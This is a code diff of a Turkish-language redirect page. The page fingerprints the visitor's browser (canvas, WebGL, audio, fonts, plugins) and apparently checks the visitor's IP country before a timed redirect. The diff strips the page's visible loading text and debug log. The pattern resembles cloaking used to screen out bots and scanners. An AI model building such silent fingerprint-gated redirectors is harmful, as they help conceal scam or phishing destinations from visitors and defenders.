@@ -2,18 +2,11 @@
 <html lang="tr">
 <head>
   <meta charset="UTF-8">
-  <title>Etkinlik Yönlendirme</title>
-  <style>
-    body { font-family: sans-serif; text-align: center; margin-top: 50px; }
-    pre { background: #f3f3f3; padding: 15px; max-width: 400px; margin: auto; text-align: left; }
-  </style>
+  <title>Yönlendirme Kontrol</title>
 </head>
 <body>
-  <h3>Etkinlik yükleniyor...</h3>
-  <pre id="log">Debug Log:</pre>
-
   <script>
-    const log = msg => document.getElementById("log").innerText += "\\n" + msg;
+    const log = (msg) => console.log(msg);
     const result = { canvas: false, audio: false, webgl: false, fonts: 0, plugins: 0 };
 
     async function getIPCountry() {
@@ -35,15 +28,19 @@
         ctx.fillText("Test", 10, 10);
         result.canvas = canvas.toDataURL().length > 100;
       } catch {}
+
       try {
+        const canvas = document.createElement("canvas");
         const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
         result.webgl = !!gl;
       } catch {}
+
       try {
         const AudioContext = window.AudioContext || window.webkitAudioContext;
         const audioCtx = new AudioContext();
         result.audio = ["running", "suspended"].includes(audioCtx.state);
       } catch {}
+
       result.fonts = document.fonts ? document.fonts.size || 100 : 100;
       result.plugins = navigator.plugins.length;
 
@@ -79,7 +76,7 @@
       }
     }
 
-    setTimeout(checkAndRedirect, 2000);
+    setTimeout(checkAndRedirect, 1500);
   </script>
 </body>
 </html>
